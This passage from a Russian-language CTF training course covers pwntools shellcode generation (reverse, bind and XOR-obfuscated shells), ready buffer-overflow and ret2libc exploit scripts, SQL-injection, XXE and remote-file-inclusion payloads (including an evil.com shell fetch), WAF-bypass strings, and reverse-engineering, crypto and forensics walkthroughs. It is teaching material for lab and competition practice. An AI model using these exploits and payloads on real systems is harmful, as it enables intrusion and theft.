reverse_sc = create_reverse_shell(ip, port)
bind_sc = create_bind_shell(port)

print(f"Reverse shell ({len(reverse_sc)} bytes):")
print(reverse_sc.hex()[:50], "...")

# Шеллкод с обфускацией
def obfuscated_shellcode():
    """Шеллкод с XOR-обфускацией"""
    context.arch = 'amd64'
    
    # Генерируем обычный шеллкод
    sc = asm(shellcraft.sh())
    
    # XOR-шифруем с ключом
    key = 0x41
    encrypted = bytes([b ^ key for b in sc])
    
    # Добавляем дешифратор
    decoder = f"""
    mov rbx, {hex(len(encrypted))}
    mov rsi, rsp
    mov rdi, rsi
    mov rcx, {hex(key)}
    decode:
        lodsb
        xor al, cl
        stosb
        dec rbx
        jnz decode
    jmp rdi
    """
    
    full_sc = asm(decoder) + encrypted
    return full_sc

# Проверка шеллкода
def test_shellcode(sc):
    """Тестирование шеллкода в изолированном окружении"""
    # Создаём временный файл с шеллкодом
    with open('/tmp/sc.bin', 'wb') as f:
        f.write(sc)
    
    # Даём права на выполнение
    os.chmod('/tmp/sc.bin', 0o755)
    
    # Запускаем через strace для отладки
    p = process(['strace', '/tmp/sc.bin'])
    return p.recvall(timeout=1)
```

### 3.6. `pwnlib.asm` и `pwnlib.disasm` — ассемблер/дизассемблер

```python
from pwn import *

# Установка архитектуры
context.arch = 'amd64'

# Ассемблирование
code = """
mov rax, 1      /* syscall write */
mov rdi, 1      /* fd = stdout */
mov rsi, rsp    /* buffer */
mov rdx, 10     /* length */
syscall
"""

binary = asm(code)
print(f"Assembled ({len(binary)} bytes): {binary.hex()}")

# Дизассемблирование
disassembled = disasm(binary)
print("\nDisassembly:")
print(disassembled)

# Поиск опкодов
def find_opcode(opcode_name):
    """Поиск опкода по названию инструкции"""
    # Для разных архитектур
    opcodes = {
        'amd64': {
            'ret': b'\xc3',
            'nop': b'\x90',
            'syscall': b'\x0f\x05',
            'int 0x80': b'\xcd\x80',
        },
        'i386': {
            'ret': b'\xc3',
            'int 0x80': b'\xcd\x80',
        }
    }
    
    return opcodes.get(context.arch, {}).get(opcode_name)

# Создание кастомного шеллкода
def create_custom_shellcode():
    """Создание кастомного шеллкода вручную"""
    context.arch = 'amd64'
    
    shellcode = b''
    
    # execve("/bin/sh", NULL, NULL)
    shellcode += asm('xor rdx, rdx')          # envp = NULL
    shellcode += asm('mov rbx, 0x68732f6e69622f')  # /bin/sh
    shellcode += asm('push rbx')              # Кладём на стек
    shellcode += asm('mov rdi, rsp')          # argv[0] = "/bin/sh"
    shellcode += asm('xor rsi, rsi')          # argv = NULL
    shellcode += asm('mov rax, 0x3b')         # syscall execve
    shellcode += asm('syscall')               # Вызов
    
    return shellcode
```

### 3.7. `pwnlib.gdb` — интеграция с отладчиком

```python
from pwn import *

# Подключение к процессу
p = process('./vuln')

# Присоединение GDB
gdb.attach(p, '''
break *main+10
continue
''')

# Или с автоматическими командами
gdb.attach(p, gdbscript='''
set follow-fork-mode child
break vuln_function
commands
  info registers
  x/20i $pc
end
continue
''')

# Запуск с отладчиком
def debug_binary(binary_path, breakpoints=None):
    """Запуск бинарника с отладчиком"""
    if breakpoints is None:
        breakpoints = ['main', 'vuln_function']
    
    # Формируем скрипт GDB
    script = ''
    for bp in breakpoints:
        script += f'break {bp}\n'
    script += 'run\n'
    
    # Запускаем процесс
    p = process(binary_path)
    gdb.attach(p, gdbscript=script)
    
    return p

# Получение backtrace при краше
def get_crash_backtrace(p):
    """Получение backtrace при краше процесса"""
    from pwnlib.util.proc import wait_for_debugger
    
    # Ждём, пока процесс упадёт
    try:
        p.wait_for_close()
    except:
        pass
    
    # Подключаем GDB для анализа core dump
    if p.corefile:
        core = p.corefile
        print(f"Core dumped: {core.path}")
        print(f"Signal: {core.signal}")
        print(f"Fault address: 0x{core.fault_addr:x}")
        
        # Получаем backtrace
        gdb_cmd = f"gdb {p.executable} {core.path} -q -ex 'bt' -ex 'quit'"
        import subprocess
        result = subprocess.run(gdb_cmd, shell=True, capture_output=True, text=True)
        print("Backtrace:")
        print(result.stdout)
        
        return core.fault_addr
    
    return None
```

## 4. Комплексные примеры эксплойтов

### Пример 1: Классическое переполнение буфера
```python
from pwn import *

def exploit_buffer_overflow():
    """Эксплойт для классического переполнения буфера"""
    
    # Конфигурация
    context.binary = './vuln'
    elf = ELF('./vuln')
    
    # Определяем архитектуру
    if elf.arch == 'amd64':
        ptr_size = 8
        ptr_pack = p64
    else:  # i386
        ptr_size = 4
        ptr_pack = p32
    
    # 1. Определяем смещение до адреса возврата
    # Способ 1: Используем cyclic pattern
    p = process('./vuln')
    pattern = cyclic(200)
    p.sendline(pattern)
    p.wait_for_close()
    
    # Получаем значение из core dump
    if p.corefile:
        crash_value = p.corefile.fault_addr
        offset = cyclic_find(crash_value & (2**(ptr_size*8)-1))
        print(f"Found offset: {offset}")
    else:
        # Способ 2: Методом бинарного поиска
        offset = 64  # Примерное значение
        print(f"Using approximate offset: {offset}")
    
    # 2. Находим адрес полезной функции
    win_addr = elf.symbols.get('win')
    if not win_addr:
        # Ищем другие цели
        system_addr = elf.plt.get('system')
        binsh_addr = next(elf.search(b'/bin/sh\x00'), 0)
        print(f"system@plt: 0x{system_addr:x}, /bin/sh: 0x{binsh_addr:x}")
    
    # 3. Создаём payload
    payload = b'A' * offset
    if win_addr:
        payload += ptr_pack(win_addr)
    elif system_addr and binsh_addr:
        # ROP-цепочка для system("/bin/sh")
        rop = ROP(elf)
        rop.call(system_addr, [binsh_addr])
        payload += rop.chain()
    
    # 4. Отправляем эксплойт
    p = process('./vuln')
    p.sendline(payload)
    
    # 5. Получаем флаг
    p.interactive()

# Запуск эксплойта
exploit_buffer_overflow()
```

### Пример 2: Format String Exploit
```python
from pwn import *

def exploit_format_string():
    """Эксплойт для уязвимости format string"""
    
    p = process('./fmt_vuln')
    elf = ELF('./fmt_vuln')
    
    # 1. Ликуем адреса из стека
    p.sendline(b'%p.' * 20)
    response = p.recvline()
    addresses = response.decode().strip().split('.')
    
    print("Leaked addresses:")
    for i, addr in enumerate(addresses[:10]):
        if addr and addr != '(nil)':
            print(f"  [{i}] 0x{int(addr, 16):x}")
    
    # 2. Ликуем значение из GOT (например, printf)
    printf_got = elf.got['printf']
    payload = p32(printf_got) + b'%7$s'  # 7-й параметр format string
    p.sendline(payload)
    
    # Получаем реальный адрес printf
    response = p.recv()
    printf_addr = u32(response[4:8])  # Пропускаем первые 4 байта (наш адрес)
    print(f"printf@libc: 0x{printf_addr:x}")
    
    # 3. Вычисляем базовый адрес libc
    # (нужна локальная копия libc или знание версии)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc_base = printf_addr - libc.symbols['printf']
    print(f"libc base: 0x{libc_base:x}")
    
    # 4. Перезаписываем GOT entry
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
    
    # Используем %n для записи по адресу
    # Это сложная часть - нужно записать правильное значение
    # Упрощённый пример:
    target_addr = elf.got['printf']
    
    # Строим сложный format string exploit
    # Обычно для этого используют готовые инструменты или шаблоны
    
    p.interactive()

exploit_format_string()
```

### Пример 3: Return-to-libc (ret2libc)
```python
from pwn import *

def exploit_ret2libc():
    """Return-to-libc атака"""
    
    context.binary = './ret2libc'
    elf = ELF('./ret2libc')
    
    # Подключаемся к удалённому сервису
    p = remote('ctf.example.com', 1337)
    
    # 1. Получаем утечку адреса libc
    # Обычно через puts(puts@got) или printf
    rop = ROP(elf)
    rop.puts(elf.got['puts'])
    rop.call(elf.symbols['main'])  # Возвращаемся для второй атаки
    
    payload = b'A' * 64 + rop.chain()
    p.sendline(payload)
    
    # Получаем утечку
    p.recvuntil(b'\n')  # Пропускаем лишние данные
    leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
    print(f"Leaked puts: 0x{leaked_puts:x}")
    
    # 2. Вычисляем базовый адрес libc
    # Нужна верная версия libc
    # Используем https://libc.blukat.me/ или локальную libc
    libc = ELF('./libc6_2.31-0ubuntu9_amd64.so')  # Пример
    
    libc_base = leaked_puts - libc.symbols['puts']
    libc.address = libc_base
    
    print(f"Libc base: 0x{libc_base:x}")
    print(f"system: 0x{libc.symbols['system']:x}")
    print(f"/bin/sh: 0x{next(libc.search(b'/bin/sh\x00')):x}")
    
    # 3. Строим финальный эксплойт
    rop = ROP([elf, libc])
    rop.system(next(libc.search(b'/bin/sh\x00')))
    
    payload = b'A' * 64 + rop.chain()
    p.sendline(payload)
    
    # 4. Получаем шелл
    p.interactive()

exploit_ret2libc()
```

## 5. Утилиты и вспомогательные функции

### Автоматизация поиска гаджетов
```python
from pwn import *

class GadgetFinder:
    """Утилита для поиска полезных ROP-гаджетов"""
    
    def __init__(self, binary_path):
        self.elf = ELF(binary_path)
        self.rop = ROP(self.elf)
        
    def find_all_gadgets(self):
        """Найти все гаджеты и классифицировать их"""
        gadgets_by_type = {
            'pop': [],
            'mov': [],
            'arithmetic': [],
            'control': [],
            'syscall': []
        }
        
        for addr, gadget in self.rop.gadgets.items():
            instr = ' '.join(gadget)
            
            if 'pop' in instr:
                gadgets_by_type['pop'].append((addr, instr))
            elif 'mov' in instr:
                gadgets_by_type['mov'].append((addr, instr))
            elif any(op in instr for op in ['add', 'sub', 'xor', 'and', 'or']):
                gadgets_by_type['arithmetic'].append((addr, instr))
            elif any(op in instr for op in ['jmp', 'call', 'ret']):
                gadgets_by_type['control'].append((addr, instr))
            elif 'syscall' in instr or 'int 0x80' in instr:
                gadgets_by_type['syscall'].append((addr, instr))
        
        return gadgets_by_type
    
    def find_chain(self, required_regs):
        """Найти цепочку гаджетов для установки регистров"""
        chains = []
        
        # Поиск pop-гаджетов для нужных регистров
        pop_gadgets = []
        for addr, instr in self.find_all_gadgets()['pop']:
            # Извлекаем регистры из инструкции
            regs = []
            for part in instr.split():
                if part.startswith('pop'):
                    regs.append(part[4:])  # Убираем 'pop '
            
            # Проверяем, покрывает ли гаджет нужные регистры
            if all(reg in ''.join(regs) for reg in required_regs):
                pop_gadgets.append((addr, regs, instr))
        
        return pop_gadgets

# Использование
finder = GadgetFinder('./vuln')
gadgets = finder.find_all_gadgets()

print("Useful gadgets found:")
for category, gadget_list in gadgets.items():
    if gadget_list:
        print(f"\n{category.upper()} ({len(gadget_list)}):")
        for addr, instr in gadget_list[:3]:  # Показываем первые 3
            print(f"  0x{addr:x}: {instr}")
        if len(gadget_list) > 3:
            print(f"  ... and {len(gadget_list)-3} more")
```

### Шаблоны для CTF
```python
from pwn import *
import argparse

def ctf_template():
    """Шаблон для CTF-задач"""
    
    parser = argparse.ArgumentParser()
    parser.add_argument('--local', action='store_true', help='Run locally')
    parser.add_argument('--debug', action='store_true', help='Enable debug')
    parser.add_argument('--remote', nargs=2, metavar=('HOST', 'PORT'))
    args = parser.parse_args()
    
    # Контекст
    context.binary = './challenge'
    context.log_level = 'debug' if args.debug else 'info'
    
    # Подключение
    if args.local:
        p = process()
    elif args.remote:
        p = remote(args.remote[0], int(args.remote[1]))
    else:
        p = process()  # По умолчанию локально
    
    # Присоединяем GDB если нужно
    if args.debug and args.local:
        gdb.attach(p, '''
        break *main
        continue
        ''')
    
    # Получаем ELF
    elf = ELF('./challenge')
    
    # Основная логика эксплойта
    def exploit():
        # Шаблон для переполнения буфера
        offset = 64  # Найти через cyclic
        
        # Ищем полезные адреса
        win_addr = elf.symbols.get('win', 0)
        system_addr = elf.plt.get('system', 0)
        binsh_addr = next(elf.search(b'/bin/sh\x00'), 0)
        
        # Создаём payload
        payload = b'A' * offset
        
        if win_addr:
            payload += p64(win_addr)
        elif system_addr and binsh_addr:
            # ROP chain
            rop = ROP(elf)
            rop.call(system_addr, [binsh_addr])
            payload += rop.chain()
        
        # Отправляем
        p.sendline(payload)
        
        # Получаем флаг
        p.interactive()
    
    # Запускаем эксплойт
    exploit()

if __name__ == '__main__':
    ctf_template()
```

## 6. Отладка и решение проблем

### Распространённые ошибки и решения

| Ошибка | Причина | Решение |
|--------|---------|---------|
| `EOFError` | Сервер закрыл соединение | Проверьте payload, используйте `p.clean()` |
| `Timeout` | Сервер не отвечает | Увеличьте `timeout`, проверьте сеть |
| `Bad instruction` | Неверная архитектура | Установите `context.arch` правильно |
| `Can't find gadget` | Не те гаджеты в бинарнике | Используйте другие гаджеты или техники |
| `Address out of range` | PIE включен, адреса меняются | Сначала получите leak адреса |

### Скрипт для отладки
```python
from pwn import *
import traceback

def debug_exploit(exploit_func, *args, **kwargs):
    """Обёртка для отладки эксплойтов"""
    
    def wrapper():
        try:
            result = exploit_func(*args, **kwargs)
            log.success("Exploit successful!")
            return result
        except Exception as e:
            log.error(f"Exploit failed: {e}")
            traceback.print_exc()
            return None
    
    return wrapper

# Использование
@debug_exploit
def test_exploit():
    p = process('./vuln')
    p.sendline(b'A' * 100)
    return p.recvall()

# Запуск с логированием
context.log_level = 'DEBUG'
test_exploit()
```

## 7. Этические соображения и лучшие практики

### Правила использования
1. **Только легальные цели** — используйте только на собственных серверах или CTF-площадках
2. **Не причиняйте вред** — даже в исследовательских целях
3. **Соблюдайте законы** — во многих странах несанкционированный взлом является преступлением

### Безопасная практика
```python
# Всегда используйте изолированное окружение
# Docker-контейнер для тестирования эксплойтов

import docker

def test_in_docker():
    """Тестирование эксплойта в Docker-контейнере"""
    
    client = docker.from_env()
    
    # Создаём контейнер с уязвимым бинарником
    container = client.containers.run(
        'ubuntu:latest',
        command=['sleep', 'infinity'],
        detach=True,
        remove=True
    )
    
    # Копируем бинарник в контейнер
    import os
    os.system(f"docker cp ./vuln {container.id}:/tmp/vuln")
    os.system(f"docker exec {container.id} chmod +x /tmp/vuln")
    
    # Запускаем бинарник в контейнере
    # ... тестируем эксплойт
    
    # Очистка
    container.kill()
```

## Заключение

`pwntools` — это **мощнейший фреймворк** для бинарной эксплуатации, который значительно упрощает создание эксплойтов для CTF. Ключевые моменты:

1. **Используйте правильные абстракции** — `remote`/`process` для подключений, `ROP` для цепочек
2. **Автоматизируйте рутину** — поиск гаджетов, создание шеллкода
3. **Отлаживайте всё** — интегрируйтесь с GDB, используйте логирование
4. **Изучайте примеры** — большинство техник уже реализованы в pwntools

Для эффективного использования:
- Изучите документацию: [docs.pwntools.com](https://docs.pwntools.com/)
- Практикуйтесь на CTF-задачах (pwn категория)
- Анализируйте готовые эксплойты с GitHub
- Участвуйте в CTF-соревнованиях

**Помните:** Этот инструмент — обоюдоострый меч. Используйте его ответственно и только в образовательных целях или на санкционированных соревнованиях.

5. Модуль 2 Веб-безопасность


**Цель**: Находить и эксплуатировать уязвимости в веб-приложениях

### **Теоретический материал:**

**Протокол HTTP/S**:
- **Методы**: GET (получение), POST (отправка), PUT (обновление), DELETE (удаление)
- **Заголовки**: `Cookie` (аутентификация), `User-Agent` (идентификация клиента), `Referer` (источник запроса)
- **Коды ответов**: 200 (OK), 301/302 (редирект), **4xx** (ошибка клиента), **5xx** (ошибка сервера)

**OWASP Top 10 (ключевые уязвимости)**:

| Уязвимость | Принцип | Методы эксплуатации |
|------------|---------|---------------------|
| **SQL-инъекция** | Внедрение SQL-кода в пользовательский ввод | `' OR '1'='1`, UNION-атаки, слепые инъекции |
| **XSS (Cross-Site Scripting)** | Внедрение JavaScript в страницу | `<script>alert(1)</script>`, кража cookie |
| **SSRF (Server-Side Request Forgery)** | Заставить сервер сделать запрос к внутренним ресурсам | `http://localhost/admin`, `file:///etc/passwd` |
| **LFI/RFI (Local/Remote File Inclusion)** | Включение локальных/удаленных файлов | `../../etc/passwd`, `http://evil.com/shell.txt` |
| **Небезопасная десериализация** | Преобразование данных в объекты с выполнением кода | PHP: `unserialize()`, Python: `pickle.loads()` |

### **Детализация:**

*   **Протокол HTTP/1.1 vs HTTP/2**: Понимание фреймов, мультиплексирования.
*   **Механизмы аутентификации и сессий**:
    *   **Cookies**: `SessionID`, флаги `HttpOnly`, `Secure`, `SameSite`.
    *   **JWT (JSON Web Tokens)**: Структура `Header.Payload.Signature`. Атаки: алгоритм `none`, слабый секрет (bruteforce).
*   **Современные атаки**:
    *   **CSRF (Cross-Site Request Forgery)**: Как работает, пример вредоносной формы, защита (токены).
    *   **XXE (XML External Entity)**: Внедрение сущностей в XML-парсер. Чтение файлов, SSRF, RCE.
        ```xml
        <!-- Пример payload -->
        <?xml version="1.0"?>
        <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
        <root>&read;</root>
        ```
    *   **Insecure Deserialization**: В PHP (`unserialize()`), Python (`pickle`), Java.
*   **Методология исследования**: `RECON -> ENUMERATION -> VULNERABILITY ASSESSMENT -> EXPLOITATION -> POST-EXPLOITATION`

### **Разбор решения задачи:**
**Задача**: На странице `https://vulnerable-site.com/search?q=test` есть SQL-инъекция. Получите версию базы данных.

**Решение**:
1. **Проверка на уязвимость**: `https://vulnerable-site.com/search?q=test'`
   - Если есть ошибка SQL, продолжаем
   
2. **Определение количества столбцов**:
   ```
   https://vulnerable-site.com/search?q=test' ORDER BY 1--
   https://vulnerable-site.com/search?q=test' ORDER BY 2--
   ...
   До ошибки "Unknown column 'N' in 'order clause'"
   ```
   
3. **Использование UNION**:
   ```sql
   https://vulnerable-site.com/search?q=test' UNION SELECT 1,2,3--
   ```
   Смотрим, какие позиции отображаются на странице
   
4. **Получение версии БД**:
   ```sql
   https://vulnerable-site.com/search?q=test' UNION SELECT 1,@@version,3--
   ```
   Для MySQL: `@@version`, для PostgreSQL: `version()`

**Разбор мышления**:
1. **Гипотеза**: Параметр `q` может быть уязвим к SQLi
2. **Проверка**: Добавляем `'` → видим ошибку SQL → гипотеза подтверждена
3. **Исследование**: Определяем тип БД по синтаксису ошибки
4. **Эксплуатация**: Используем UNION для получения данных
### Практические задания:
1. Пройдите первые 5 лабораторий SQLi на PortSwigger Web Security Academy
2. Эксплуатируйте хранимый XSS в учебном приложении OWASP Juice Shop
3. Используйте Burp Suite для перехвата запроса и подмены параметров
### **Практические задания (исследовательская):**
1. **Полный аудит учебного приложения**: Разверните OWASP Juice Shop. Используя только Burp Suite и мозг, найдите и задокументируйте **не менее 10 различных уязвимостей**, включая цепочку из 2+ уязвимостей.
2. **Исследование API**: Для заданного REST API составьте чек-лист тестов: проверка авторизации, инъекции в параметры, лимиты запросов.
3. **Обход WAF**: Научитесь обходить простые фильтры WAF:
    *   SQLi: `UNION SELECT` -> `UNI/**/ON SEL/**/ECT`
    *   XSS: `<script>` -> `<svg/onload=alert()>`

---

6. Модуль 3 Реверс-инжиниринг и бинарный анализ


**Цель**: Понимать логику работы программы по её бинарному представлению

### **Теоретический материал:**

**Форматы исполняемых файлов**:

| Формат                                   | Платформа | Структура                                                  |
| ---------------------------------------- | --------- | ---------------------------------------------------------- |
| **PE (Portable Executable)**             | Windows   | DOS-заголовок, PE-заголовок, секции (.text, .data, .rdata) |
| **ELF (Executable and Linkable Format)** | Linux     | ELF-заголовок, таблица секций, таблица сегментов           |

**Инструменты для анализа**:
- **Статический анализ** (без запуска): Ghidra, IDA Free, radare2/Cutter
- **Динамический анализ** (с запуском): GDB (с GEF/Peda), x64dbg, OllyDbg

**Основы ассемблера для анализа**:
```nasm
; Типичная функция
push    ebp              ; сохраняем предыдущий базовый указатель
mov     ebp, esp         ; устанавливаем новый базовый указатель
sub     esp, 0x10        ; выделяем место для локальных переменных
mov     eax, [ebp+0x8]   ; читаем первый аргумент
add     eax, 0x1         ; прибавляем 1
mov     [ebp-0x4], eax   ; сохраняем результат
mov     eax, [ebp-0x4]   ; возвращаем результат
leave                    ; восстанавливаем стек
ret                      ; возврат из функции
```

### **Детализация:**
*   **Архитектура x86/x64**:
    *   Регистры общего назначения, сегментные, флаги.
    *   **Соглашения о вызовах (Calling Conventions)**: `cdecl`, `stdcall`, `fastcall`, `System V AMD64 ABI`.
*   **Структура стека**:
    ```
    Высокие адреса
    | ...         |
    | Аргумент 2  |
    | Аргумент 1  |
    | Ret Addr    | <-- EIP/RIP сюда перейдёт после ret
    | Saved EBP   | <-- Указатель на предыдущий кадр стека
    | Локальная 1 |
    | Локальная 2 |
    Низкие адреса
    ```
*   **Техники обфускации и анти-отладки**:
    *   Упаковка (UPX, ASPack).
    *   Обфускация контроля потока.
    *   Проверки на отладчик: `IsDebuggerPresent`, `PTRACE_TRACEME`.
*   **Динамический анализ с GDB + GEF/PEDA**:
    ```bash
    gdb ./crackme
    break *main          # Брейкпоинт на начало main
    run                  # Запуск
    nexti                # Следующая инструкция (шаг обхода)
    stepi                # Следующая инструкция (с заходом в call)
    info registers       # Показать регистры
    x/20wx $esp          # Исследовать 20 слов (4 байта) стека
    x/s 0x804a000        # Посмотреть строку по адресу
    ```

### **Разбор решения задачи:**
**Задача**: Дан crackme (программа с проверкой пароля). Найдите правильный пароль.

**Решение с Ghidra**:
1. **Загрузка файла**: File → Import → выбираем crackme
2. **Анализ**: Ghidra автоматически анализирует код
3. **Поиск main**: В Symbol Tree ищем `main` или entry point
4. **Декомпиляция**: Читаем псевдокод на C:
```c
void main(void) {
  char input[32];
  printf("Enter password: ");
  fgets(input, 32, stdin);
  
  if (strcmp(input, "secret123") == 0) {
    printf("Access granted!");
  } else {
    printf("Wrong password!");
  }
}
```
5. **Находка**: Пароль — `secret123`

**Альтернативное решение через strings**:
```bash
$ strings crackme | grep -i password
Enter password:
secret123
Wrong password!
Access granted!
```

**Разбор мышления**:
1. **Первичный осмотр**: `file crackme`, `strings crackme`
2. **Выбор подхода**: Если в strings есть пароль — задача решена. Если нет — идем в Ghidra
3. **Анализ логики**: Ищем сравнения (`strcmp`, `memcmp`), циклы, условия
4. **Верификация**: Проверяем найденный пароль на реальной программе
### Практические задания:
1. Установите Ghidra и проанализируйте простой crackme с crackmes.one
2. Запустите crackme в GDB, поставьте брейкпоинт на `strcmp` и проанализируйте аргументы
3. Исправьте бинарный файл (патчинг), чтобы он всегда выдавал "Access Granted"
### **Практические задания (пошаговый разбор сложного crackme):**
1. **Статический анализ в Ghidra**:
    *   Загрузите файл, проанализируйте.
    *   Найдите `main` или `entry`. Переименуйте функции (`F2`), переменные.
    *   Внимательно изучите граф исполнения (Control Flow Graph). Найдите ключевые условия (`if`, `switch`).
    *   Определите, где ввод, где проверка.
2. **Динамическая проверка**:
    *   Запустите в GDB, поставьте брейкпоинт на функцию проверки (например, `strcmp`).
    *   Изучите аргументы, которые ей передаются (`x/s` по адресу в регистрах).
    *   Измените значение регистра флагов (`set $eflags=...`) или код возврата функции.
3. **Автоматизация с pwntools**: Напишите скрипт, который подключается к бинарному сервису по сети, вычисляет правильный ключ и отправляет его.





7. Модуль 4 Криптография


**Цель**: Анализировать и взламывать криптосистемы

### **Теоретический материал:**
**Классификация криптоалгоритмов**:
```
Криптография
├── Симметричное шифрование (один ключ)
│   ├── Блочные: AES (128/256), DES, 3DES
│   └── Поточные: RC4, ChaCha20
├── Асимметричное шифрование (два ключа)
│   ├── RSA (основана на факторизации)
│   ├── ECC (эллиптические кривые)
│   └── Diffie-Hellman (обмен ключами)
└── Хеш-функции (необратимые)
    ├── MD5 (128 бит, устарел)
    ├── SHA-1 (160 бит, небезопасен)
    └── SHA-256, SHA-3 (рекомендуются)
```

**Классические шифры и их взлом**:
- **Шифр Цезаря**: Сдвиг букв на N позиций. Взлом: частотный анализ (26 вариантов)
- **Шифр Виженера**: Ключевое слово + таблица. Взлом: метод Казиски, индекс совпадений
- **XOR**: `A ⊕ B = C`, `C ⊕ B = A`. Если ключ короче текста — повторяется

### **Детализация:**
*   **Блочные шифры (режимы работы)**:
    *   **ECB (Electronic Codebook)**: Каждый блок шифруется независимо. Уязвим к анализу шаблонов.
    *   **CBC (Cipher Block Chaining)**: Каждый блок XOR-ится с предыдущим зашифрованным блоком. Уязвим к атакам "padding oracle".
*   **Атаки на RSA**:
    *   **Маленький модуль (n)**: Факторизация через `factordb.com` или `yafu`.
    *   **Одинаковый модуль, разные экспоненты**: Можно восстановить сообщение.
    *   **Маленькая экспонента (e=3)**: Корень кубический из шифротекста.
    *   **Частично известный plaintext (атака Коppersмита)**.
*   **Эллиптические кривые (ECC)**: Основы (точки на кривой, сложение). Уязвимости: плохо сгенерированные кривые, маленький порядок подгруппы.
*   **Протоколы и их уязвимости**:
    *   **Diffie-Hellman**: Атака "man-in-the-middle" при отсутствии аутентификации.
    *   **SSL/TLS**: Устаревшие версии (SSLv3, TLS 1.0), слабые шифросети.

### **Разбор решения задачи:**
**Задача**: Дана строка, зашифрованная XOR с однобайтовым ключом. Расшифруйте.

**Решение на Python**:
```python
def brute_force_xor_single_byte(ciphertext):
    # ciphertext - байтовая строка
    for key in range(256):  # все возможные байты
        plaintext = bytes([b ^ key for b in ciphertext])
        
        # Проверяем, что получился читаемый текст
        if all(32 <= b <= 126 for b in plaintext[:20]):
            print(f"Ключ: {key} (0x{key:02x}), Текст: {plaintext[:50]}...")
            
# Использование
ciphertext = bytes.fromhex("1c5a3e4a5b2a1c0b3e4a5b2a1c0b3e4a")
brute_force_xor_single_byte(ciphertext)
```

**Задача на RSA**:
```
Дано: n = 3233, e = 17, c = 2790
Найти: исходное сообщение m
```

**Решение**:
1. **Факторизуем n**: `3233 = 61 * 53` (p=61, q=53)
2. **Вычисляем φ(n)**: `φ = (p-1)*(q-1) = 60*52 = 3120`
3. **Находим d**: `d = e^(-1) mod φ(n) = 17^(-1) mod 3120 = 2753`
4. **Расшифровываем**: `m = c^d mod n = 2790^2753 mod 3233 = 65` (ASCII 'A')

**Разбор мышления**:
1. **Идентификация**: Определяем тип шифра (по формату данных, описанию)
2. **Поиск уязвимостей**: Маленький ключ? Повторение? Известна часть plaintext?
3. **Выбор атаки**: Брутфорс, частотный анализ, математическая атака (для RSA)
4. **Верификация**: Проверяем, что результат осмысленный
### Практические задания:
1. Напишите программу для взлома шифра Цезаря частотным анализом
2. Решите задачи "RSA Starter 1-5" на CryptoHack
3. Проведите атаку padding oracle на учебном сервере
### **Практические задания (реальные сценарии):**
1. **Атака на CBC с Padding Oracle**: Разверните уязвимый сервер. Напишите скрипт, который, взаимодействуя с сервером и определяя по коду ответа, верен ли padding, полностью расшифровывает произвольный шифротекст.
2. **Полный взлом RSA**: Даны `n`, `e`, `c`. Напишите универсальный скрипт, который:
    *   Проверяет `n` на факторизацию через интернет-базы.
    *   Проверяет, можно ли вычислить корень степени `e` из `c`.
    *   Проверяет наличие уязвимости Винера (маленькая `d`).
    *   В случае успеха выводит `m` и преобразует его в текст.
3. **Криптоанализ шифра Виженера**: Дайте зашифрованный текст без ключа. Напишите программу, которая:
    *   Определяет длину ключа (метод Казиски, индекс совпадений).
    *   Для каждой позиции ключа делает частотный анализ.
    *   Подбирает наиболее вероятный ключ и выводит расшифрованный текст.




8. Модуль 5 Расследование инцидентов (Digital Forensics)


**Цель**: Восстанавливать события по цифровым следам

### **Теоретический материал:**
**Источники цифровых улик**:
- **Сетевой трафик** (PCAP-файлы): запись всех сетевых пакетов
- **Файловые системы** (образы дисков): файлы, метаданные, удаленные данные
- **Оперативная память** (дампами): запущенные процессы, сетевые соединения, пароли
- **Журналы (логи)**: системные события, действия пользователей

**Инструменты и их назначение**:
| Инструмент | Для чего используется | Команды/действия |
|------------|----------------------|------------------|
| **Wireshark** | Анализ сетевого трафика | Фильтры: `http`, `tcp.stream eq 0`, `ip.src==192.168.1.1` |
| **Autopsy/Sleuth Kit** | Анализ файловых систем | Поиск файлов по хешу, восстановление удаленных |
| **Volatility** | Анализ дампов памяти | `pslist` (процессы), `connscan` (соединения), `hashdump` (пароли) |
| **binwalk** | Поиск вложенных файлов | `binwalk -e file.bin` (извлечение) |
| **exiftool** | Анализ метаданных | `exiftool photo.jpg` |

### **Детализация:**
*   **Файловые системы (NTFS, ext4)**:
    *   **Структура NTFS**: MFT (Master File Table), записи файлов, атрибуты (`$DATA`, `$FILENAME`), resident vs non-resident данные.
    *   **Методология анализа**: Поиск по ключевым словам (`strings`, `grep`), восстановление временной шкалы (`fls`, `mactime`), извлечение удаленных файлов (`icat`).
*   **Анализ памяти с Volatility 3**:
    *   Определение профиля ОС (`windows.info`).
    *   Поиск процессов (`windows.pslist`, `windows.psscan`), сетевых подключений (`windows.netscan`).
    *   Дамп процесса и анализ его памяти на наличие секретов (`windows.memmap`, `windows.dumpfiles`).
    *   Поиск в сырой памяти на наличие артефактов (`windows.vadinfo`).
*   **Анализ журналов (Log Analysis)**: Понимание форматов логов Windows (Event Logs `evtx`) и Linux (`syslog`, `auth.log`). Фильтрация по времени, событию ID, пользователю.

### **Разбор решения задачи:**
**Задача**: В дампе трафика `attack.pcap` найдите, какие данные были похищены и куда отправлены.

**Решение с Wireshark**:
1. **Открываем файл**: `wireshark attack.pcap`
2. **Ищем HTTP-трафик**: Фильтр: `http`
3. **Анализируем POST-запросы** (передача данных):
   - Кликаем правой кнопкой → Follow → TCP Stream
   - Видим содержимое: `username=admin&password=secret&file=flag.txt`
4. **Ищем exfiltration** (утечку данных):
   - Фильтр: `http contains "flag"` или `http contains "upload"`
   - Находим запрос на `http://evil.com/upload.php`
5. **Экспортируем объекты**: File → Export Objects → HTTP
   - Находим загруженный файл `flag.txt`

**Разбор мышления**:
1. **Понимание контекста**: Что произошло? Какие данные могли быть украдены?
2. **Поиск индикаторов**: Необычные домены, большие передачи данных, странные порты
3. **Восстановление цепочки**: Кто → Что → Куда → Когда
4. **Документирование**: Фиксация доказательств для отчета
### Практические задания:
1. Проанализируйте дамп трафика с Malware-Traffic-Analysis.net, найдите вредоносный домен
2. В Autopsy найдите удаленный файл в образе диска
3. Используйте Volatility для извлечения паролей из дампа памяти
### **Практические задания (полный кейс):**
1. **Расследование на основе образа диска**: Вам дан образ диска (`.E01` или `.dd`). Задачи:
    *   Установите время инцидента.
    *   Найдите подозрительный исполняемый файл, загруженный пользователем.
    *   Извлеките этот файл, получите его хеш.
